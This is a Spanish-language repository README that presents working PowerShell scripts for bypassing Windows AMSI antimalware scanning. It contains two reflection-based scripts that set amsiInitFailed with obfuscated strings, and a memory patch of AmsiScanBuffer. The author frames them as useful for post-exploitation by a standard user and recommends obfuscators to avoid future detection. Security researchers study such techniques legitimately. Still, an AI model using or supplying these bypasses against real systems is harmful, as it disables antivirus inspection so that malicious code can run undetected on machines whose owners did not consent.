# Bypass-AMSI
Estudio de la Protección AMSI de Windows

Este repositorio contiene algunos métodos de evasión en AMSI que he encontrado, fueron probados en los siguiewntes sistemas operativos:

- Windows 10
- Windows 11
- Windows Server 2016
- Windows Server 2019
- Windows Server 2022


Todos en sus versión nás reciente para el momento (21H2) y probados en PowerShell 5.1 como en 7.2

Se dejaron por fuera técnicas que ya han sido parchadas o que utilicen ejecutables o DLL modificadas debido a que, con el pasar del tiempo, las firmas de estos archivos son detectados por los antivirus; por esta razón se privilegiaron aquellas técnicas que puedan ser ejecutadas en memoria y con un usuario estándar lo cuales pueden ser útiles en un escenario de post explotación.

Estos scripts podrían ser detectados por AMSI en el futuro. Por lo que recomiendo usar herramienta de ofuscaión como [Chimera](https://github.com/tokyoneon/Chimera) o [Invoke-Stelth](https://github.com/JoelGMSec/Invoke-Stealth).

1. [Método Reflection de Matt Graeber](#Método Reflection de Matt Graeber "Goto Método Reflection de Matt Graeber")
2. [Error Forzado](#ferror)
3. DLL Hijacking
4. [Memory Patching](#patching)
5. Ofuscación con Chimera

## Método Reflection de Matt Graeber {#reflection}

<details><summary>Ver Script</summary>
<p>
 
```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```
 </p>
</details>

## Error Forzado {#ferror}

<details><summary>Ver Script</summary>
<p>
 
```powershell
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils' 
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)   
```
 </p>
</details>


## Memory Patching {#patching}

<details><summary>Ver Script</summary>
<p>

```powershell
$Win32 = @"
 
using System;
using System.Runtime.InteropServices;
 
public class Win32 {
 
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
 
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
}
"@
 
Add-Type $Win32
 
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]0)
$Patch = [Byte[]] (0xc3, 0x90, 0x90)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 3)  
```
</p>
</details>
